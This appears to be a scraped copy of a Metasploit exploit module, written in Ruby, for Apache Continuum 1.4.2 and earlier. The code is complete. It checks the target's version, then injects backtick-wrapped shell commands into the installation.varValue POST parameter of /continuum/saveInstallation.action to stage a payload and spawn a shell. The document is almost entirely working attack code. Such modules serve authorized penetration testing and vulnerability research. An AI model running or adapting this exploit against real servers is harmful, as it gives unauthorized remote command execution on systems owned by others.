# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
 
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Continuum Arbitrary Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a command injection in Apache Continuum <= 1.4.2.
        By injecting a command into the installation.varValue POST parameter to
        /continuum/saveInstallation.action, a shell can be spawned.
      },
      &#039;Author&#039;         => [
        &#039;David Shanahan&#039;, # Proof of concept
        &#039;wvu&#039;             # Metasploit module
      ],
      &#039;References&#039;     => [
        %w{EDB 39886}
      ],
      &#039;DisclosureDate&#039; => &#039;Apr 6 2016&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X86_64],
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        => [
        [&#039;Apache Continuum <= 1.4.2&#039;, {}]
      ],
      &#039;DefaultTarget&#039;  => 0
    ))
 
    register_options([
      Opt::RPORT(8080)
    ])
  end
 
  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => &#039;/continuum/about.action&#039;
    )
 
    if res && res.body.include?(&#039;1.4.2&#039;)
      CheckCode::Appears
    elsif res && res.code == 200
      CheckCode::Detected
    else
      CheckCode::Safe
    end
  end
 
  def exploit
    print_status(&#039;Injecting CmdStager payload...&#039;)
    execute_cmdstager(flavor: :bourne)
  end
 
  def execute_command(cmd, opts = {})
    send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => &#039;/continuum/saveInstallation.action&#039;,
      &#039;vars_post&#039; => {
        &#039;installation.name&#039;     => Rex::Text.rand_text_alpha(8),
        &#039;installation.type&#039;     => &#039;jdk&#039;,
        &#039;installation.varValue&#039; => &#039;`&#039; + cmd + &#039;`&#039;
      }
    )
  end
 
end

